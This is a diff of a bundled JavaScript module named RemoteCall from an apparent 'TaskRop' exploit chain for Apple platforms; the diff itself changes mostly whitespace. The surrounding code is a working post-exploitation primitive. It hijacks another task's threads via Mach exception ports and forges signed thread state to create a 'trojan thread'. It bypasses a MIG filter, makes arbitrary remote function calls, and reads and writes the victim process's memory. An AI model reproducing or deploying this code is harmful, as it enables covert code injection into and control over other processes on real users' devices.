@@ -1,3 +1,9 @@
+/***/ "./src/libs/TaskRop/RemoteCall.js":
+/*!****************************************!*\
+  !*** ./src/libs/TaskRop/RemoteCall.js ***!
+  \****************************************/
+/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+
 __webpack_require__.r(__webpack_exports__);
 /* harmony export */ __webpack_require__.d(__webpack_exports__, {
 /* harmony export */   "default": () => (/* binding */ RemoteCall)
@@ -117,7 +123,7 @@ class RemoteCall
 
 		let firstExceptionPort = _Exception__WEBPACK_IMPORTED_MODULE_5__["default"].createPort();
 		let secondExceptionPort = _Exception__WEBPACK_IMPORTED_MODULE_5__["default"].createPort();
-
+	
 		if (!firstExceptionPort || !secondExceptionPort)
 		{
 			console.log(TAG,`Couldn't create exception ports`);
@@ -140,7 +146,7 @@ class RemoteCall
 		let dummyThread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
 		let dummyFunc = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym("getpid");
 		//console.log(TAG,`dummyFunc:${Utils.hex(dummyFunc)}`);
-
+		
 		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_create_suspended_np",dummyThread, null, dummyFunc, null);
 		dummyThread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(dummyThread);
 		let dummyThreadMach = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_mach_thread_np",dummyThread));
@@ -149,16 +155,16 @@ class RemoteCall
 		let threadSelf = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_thread_self"));
 		let selfThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(threadSelf);
 		let selfThreadCtid = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getCtid(selfThreadAddr);
-
+	
 		//console.log(TAG,`Dummy thread:${Utils.hex(dummyThreadMach)}`);
 		//console.log(TAG,`Dummy thread object:${Utils.hex(dummyThreadAddr)}`);
 		//console.log(TAG,`Dummy thread tro:${Utils.hex(dummyThreadTro)}`);
-
+	
 		//console.log(TAG,`Self thread:${Utils.hex(threadSelf)}`);
 		//console.log(TAG,`Self thread object:${Utils.hex(selfThreadAddr)}`);
 		//console.log(TAG,`Guard exc code:${Utils.hex(guardCode)}`);
 		//console.log(TAG,`Self thread ctid:${Utils.hex(selfThreadCtid)}`);
-
+		
 		this.#creatingExtraThread = true;
 		this.#firstExceptionPort = firstExceptionPort;
 		this.#secondExceptionPort = secondExceptionPort;
@@ -175,12 +181,12 @@ class RemoteCall
 		let successThreadCount = 0;
 		let firstThread = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].firstThread(this.#taskAddr);
 		let currThread = firstThread;
-
+	
 		this.#trojanThreadAddr = firstThread;
 
 		if (migFilterBypass)
 			migFilterBypass.resume();
-
+		
 		while ( true && successThreadCount < 2 && validThreadCount < 5 && retryCount < 3)
 		{
 			let task = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTask(currThread);
@@ -295,7 +301,7 @@ class RemoteCall
 		this.#originalState.opaque_pc = exc.threadState.opaque_pc;
 		this.#originalState.cspr = exc.threadState.cspr;
 		this.#originalState.opaque_flags = exc.threadState.opaque_flags;
-
+	
 		//console.log(TAG,`Clear EXC_GUARD from all other threads...`);
 
 		for(let i = 0; i < this.#threadList.length;i++)
@@ -323,15 +329,15 @@ class RemoteCall
 		//console.log(TAG,`updated PC:${Utils.hex(newState.opaque_pc)} and LR:${Utils.hex(newState.opaque_lr)}`);
 		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
 		//console.log(TAG,`Trojan thread created`);
-
+		
 		//console.log(TAG,`Test remote getpid()`);
 		//let pidRemote = this.#doRemoteCallTemp(100, "getpid");
 		//console.log(TAG,`pidRemote:${pidRemote}`);
-
+		
 		// Use stack as a temporary remote memory
 		let trojanMemTemp = exc.threadState.opaque_sp & 0x7fffffffffn;
 		//console.log(TAG,`Remote memory:${Utils.hex(trojanMemTemp)}`);
-
+		
 		// Substracting a bit from stack pointer to not corrupt original stack
 		trojanMemTemp = trojanMemTemp - 0x100n;
 
@@ -345,10 +351,10 @@ class RemoteCall
 		let ret = this.#doRemoteCallTemp(100, "pthread_create_suspended_np", trojanMemTemp, 0n, remoteCrashSigned);
 		//console.log(TAG,`pthread_create_suspended_np:${Utils.hex(ret)}`);
 		//VM.mocker(0x221d54,0xffffffdc08875500n);
-
+		
 		let pthreadAddr = this.read64(BigInt(trojanMemTemp));
 		//console.log(TAG,`pthreadAddr:${Utils.hex(pthreadAddr)}`);
-
+		
 		// Get mach port of the new thread and set exception port on it.
 		let callThreadPort = this.#doRemoteCallTemp(100, "pthread_mach_thread_np", pthreadAddr);
 		//console.log(TAG,`Call thread port:${Utils.hex(callThreadPort)}`);
@@ -387,7 +393,7 @@ class RemoteCall
 
 		if (migFilterBypass)
 			migFilterBypass.pause();
-
+		
 		console.log(TAG,`All good so far! Now we resume trojan thread...`);
 
 		// Ok, now we are ready to start this thread and catch exceptions on it.
@@ -410,14 +416,14 @@ class RemoteCall
 		//console.log(TAG, `Original thread restored succesfully, testing getpid on stable primitive`);
 		this.#pid = this.#doRemoteCallStable(100, "getpid");
 		console.log(TAG, `Task pid: ${this.#pid}`);
-
+		
 		//this.#trojanMem = trojanMemTemp;
 		//this.#testRWPrim();
 
 		// Allocate a general purpose remote page mem.
 		this.#trojanMem = this.#doRemoteCallStable(1000,"mmap", 0n, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_SIZE, _VM__WEBPACK_IMPORTED_MODULE_9__["default"].VM_PROT_READ | _VM__WEBPACK_IMPORTED_MODULE_9__["default"].VM_PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1n);
 		//console.log(TAG,`Newly mapped memory:${Utils.hex(this.#trojanMem)}`);
-
+		
 		// Memory must be written at least once (COW) to be found in vmMap.
 		this.#doRemoteCallStable(100,"memset",this.#trojanMem, 0n, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_SIZE);
 
@@ -496,11 +502,11 @@ class RemoteCall
 		}
 		return state;
 	}
-
+	
 	#setExceptionPortOnThread(exceptionPort, currThread, migFilterBypass=null)
 	{
 		let success = false;
-
+		
 		let thread_set_exception_ports_addr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym("thread_set_exception_ports");
 		let pthread_exit_addr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym("pthread_exit");
 
@@ -514,7 +520,7 @@ class RemoteCall
 		//let state = new ThreadState(stateBuff);
 
 		//let kr = Native.callSymbol("thread_create_running", 0x203, Utils.ARM_THREAD_STATE64, statePtr, Utils.ARM_THREAD_STATE64_COUNT, machThreadPtr);
-
+		
 		let pthreadPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
 		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_create_suspended_np", pthreadPtr, 0, thread_set_exception_ports_addr, 0);
 		let pthread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(pthreadPtr);
@@ -555,7 +561,7 @@ class RemoteCall
 
 		if (migFilterBypass)
 			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 100000);
-
+	
 		if (!_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].setState(machThread, machThreadAddr, state))
 			return false;
 
@@ -565,7 +571,7 @@ class RemoteCall
 			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 100000);
 
 		_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].setMutex(this.#dummyThreadAddr, this.#selfThreadCtid);
-
+		
 		if (!_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].resume(machThread))
 			return false;
 
@@ -754,7 +760,7 @@ class RemoteCall
 		newState = this.#signState(this.#trojanThreadAddr, newState, pcAddr, fakeLRTrojanCreator);
 		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
 		exc.threadState.registers.set(0,x0);
-
+	
 		// Don't wait for a new exception if timeout is < 0. Eg, when doing cleanup of trojan thread.
 		if (timeout < 0)
 		{
@@ -770,13 +776,13 @@ class RemoteCall
 		excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
 		exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
 		let retValue = exc.threadState.registers.get(0);
-
+	
 		// Corrupt again PC so we can control flow for the next call.
 		newState = exc.threadState;
 		// Can be therotical used one previous implementation doesn't set LR
 		//signState(remoteCall->trojanThreadAddr, &newState, 0x101, 0);
 		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
-
+	
 		return retValue;
 	}
 
@@ -794,7 +800,7 @@ class RemoteCall
 	{
 		if (!this.#creatingExtraThread)
 			return this.#doRemoteCallTemp(timeout, name, x0, x1, x2, x3, x4, x5, x6, x7);
-
+			
 		//Calculate actual pc addr
 		let pcAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym(name);
 		if (!pcAddr) {
@@ -840,13 +846,13 @@ class RemoteCall
 		excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
 		exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
 		let retValue = exc.threadState.registers.get(0);
-
+	
 		// Corrupt again PC so we can control flow for the next call.
 		newState = exc.threadState;
 		// Can be therotical used one previous implementation doesn't set LR
 		//signState(remoteCall->trojanThreadAddr, &newState, 0x101, 0);
 		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
-
+	
 		return retValue;
 	}
 
@@ -911,16 +917,16 @@ class RemoteCall
 			let offs = src & libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_MASK;
 			let copyCount =  libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MIN(_Task__WEBPACK_IMPORTED_MODULE_3__["default"].round_page(src + 1n) - src, size);
 			let pageAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(src);
-
+	
 			let remotePage = this.#getShmemForPage(pageAddr);
 			if (!remotePage) {
 				console.log(TAG, "read() failed: unable to find remote page");
 				return false;
 			}
-
+	
 			//console.log(TAG,`remotePage: remote=${Utils.hex(remotePage.remoteAddress)}, local=${Utils.hex(remotePage.localAddress)}, port=${Utils.hex(remotePage.port)}`);
 			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("memcpy", dst, remotePage.localAddress + offs, copyCount);
-
+	
 			src += copyCount;
 			dst += copyCount;
 		}
@@ -939,23 +945,23 @@ class RemoteCall
 		let until = dst + size;
 
 		//console.log(TAG, `write(): dst=${Utils.hex(dst)}, src=${Utils.hex(src)}, size=${size}`);
-
+	
 		while (dst < until)
 		{
 			size = until - dst;
 			let offs = dst & libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_MASK;
 			let copyCount = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].MIN(_Task__WEBPACK_IMPORTED_MODULE_3__["default"].round_page(dst + 1n) - dst, size);
 			let pageAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].trunc_page(dst);
-
+	
 			let remotePage = this.#getShmemForPage(pageAddr);
 			if (!remotePage) {
 				console.log(TAG, "write() failed: unable to find remote page");
 				return false;
 			}
-
+	
 			//console.log(TAG,`remotePage: remote=${Utils.hex(remotePage.remoteAddress)}, local=${Utils.hex(remotePage.localAddress)}, offs=${offs}, length=${copyCount}, port=${Utils.hex(remotePage.port)}`);
 			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("memcpy", remotePage.localAddress + offs, src, copyCount);
-
+	
 			dst += copyCount;
 			src += copyCount;
 		}
@@ -1024,7 +1030,7 @@ class RemoteCall
 			console.log(TAG, "insertRight: error while sending message: " + errString);
 			return 0;
 		}
-
+		
 		//TODO receive in remote task
 		msg.msgh_size = 0x100;
 		msg.msgh_local_port = this.#remotePort;
@@ -1116,10 +1122,12 @@ class RemoteCall
 		code |= ((flavor & BigInt('0x1fffffff')) << 32n);
 		return code;
 	}
-
+	
 	#EXC_GUARD_ENCODE_TARGET(code, target)
 	{
 		code |= target & BigInt('0xffffffff');
 		return code;
 	}
 }
+
+/***/ }),
